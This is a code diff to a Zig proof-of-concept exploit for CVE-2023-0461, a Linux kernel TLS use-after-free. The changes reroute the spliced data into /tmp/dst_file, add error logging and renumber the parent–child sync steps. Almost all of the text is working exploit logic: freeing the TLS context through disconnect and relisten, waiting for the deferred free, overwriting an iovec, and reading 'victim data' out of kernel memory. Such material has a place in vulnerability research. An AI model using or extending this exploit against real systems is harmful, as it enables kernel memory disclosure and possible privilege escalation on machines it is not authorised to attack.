@@ -3,6 +3,7 @@ const assert = std.debug.assert;
 const log = std.log;
 const net = std.net;
 const os = std.os;
+const fs = std.fs;
 const errno = os.errno;
 const l = os.linux;
 const E = l.E;
@@ -175,8 +176,10 @@ const SyncPipe = struct {
         var buf = [_]u8{0x00};
         _ = try os.read(self.pipe[0], &buf);
 
-        if (buf[0] != on)
+        if (buf[0] != on) {
+            log.err("desync: {} != {}", .{ buf[0], on });
             return error.desync;
+        }
     }
 
     pub fn cont(self: Self, on: u8) !void {
@@ -199,9 +202,9 @@ fn cve_2023_0461() !void {
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
 
-    const dst_pipe = try os.pipe();
-    _ = try os.fcntl(dst_pipe[0], F.SETPIPE_SZ, mem.page_size * 3);
-    _ = try os.fcntl(dst_pipe[1], F.SETPIPE_SZ, mem.page_size * 3);
+    const dst_file = try fs.createFileAbsolute("/tmp/dst_file", .{
+        .truncate = true,
+    });
 
     const src_pipe = try os.pipe();
     _ = try os.fcntl(src_pipe[0], F.SETPIPE_SZ, mem.page_size * 17);
@@ -230,40 +233,34 @@ fn cve_2023_0461() !void {
         try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
         try setTLSOpt(client_sk0, .RX);
         defer os.closeSocket(client_sk0);
+        try sync.cont(1);
 
         log.info("child: connect for second connection", .{});
         const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(client_sk1);
-        try sync.wait(1);
+        try sync.wait(2);
         try retry_connect(client_sk1, target_addr_p, addr_sz);
 
         log.info("child: wait for parent to enter splice", .{});
-
-        {
-            var buf: [2048]u8 = .{0x41} ** (mem.page_size / 2);
-            const len = try os.read(dst_pipe[0], &buf);
-
-            log.info("child: read {}: {s}", .{
-                len,
-                std.fmt.fmtSliceEscapeLower(buf[0..@min(64, len)]),
-            });
-        }
+        try sync.wait(3);
 
         log.info("child: try overwrite iovec", .{});
-        try setTLSOpt(target_sk, .RX);
+        setTLSOpt(target_sk, .RX) catch |e| {
+            log.err("child: setTLSOpt failed: {}", .{e});
+        };
 
         log.info("child: read victim data", .{});
         {
-            var buf = [_]u8{0x42} ** (2048 + (4096 * 2) + 512);
-            const len = try os.read(dst_pipe[0], &buf);
+            var buf = [_]u8{0x42} ** ((4096 * 3) + 512);
+            const len = try dst_file.read(&buf);
 
             log.info("child: read {}: {s}", .{
                 len,
-                std.fmt.fmtSliceEscapeLower(buf[@min(len, 2048 + 4096)..len]),
+                std.fmt.fmtSliceEscapeLower(buf[@min(len, 3 * 4096)..len]),
             });
         }
 
-        try sync.cont(3);
+        try sync.cont(4);
 
         return;
     }
@@ -275,20 +272,22 @@ fn cve_2023_0461() !void {
     try retry_connect(target_sk, server_addr_p, addr_sz);
     try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");
 
+    try sync.wait(1);
+    log.info("parent: disconnect", .{});
     try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
     try os.bind(target_sk, target_addr_p, addr_sz);
 
     log.info("parent: listen for second connection", .{});
 
     try os.listen(target_sk, 1);
-    try sync.cont(1);
+    try sync.cont(2);
 
     const client_sk = try os.accept(target_sk, null, null, 0);
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
 
     log.info("parent: fill the src pipe while we wait", .{});
-    const blocker: [4096 * 3]u8 = .{ 'b', 'l', 'o', 'k' } ** (1024 * 3);
+    const blocker: [4096 * 3]u8 = .{0x00} ** (4096 * 3);
     const tls_sw_ctx_rx: [4096]u8 = .{0x00} ** 4096;
     const to_write = blocker.len + tls_sw_ctx_rx.len;
     const iov = [2]iovec_const{
@@ -315,9 +314,10 @@ fn cve_2023_0461() !void {
 
     log.info("parent: wait for deferred free", .{});
     os.nanosleep(6, 0);
+    try sync.cont(3);
 
     {
-        const len = try splice(src_pipe[0], null, dst_pipe[1], null, to_write, 0);
+        const len = try splice(src_pipe[0], null, dst_file.handle, null, to_write, 0);
 
         if (len != to_write) {
             log.err("parent: splice {} != {}", .{
@@ -328,7 +328,7 @@ fn cve_2023_0461() !void {
         }
     }
 
-    try sync.wait(3);
+    try sync.wait(4);
 
     log.info("Goodbye!", .{});
 }
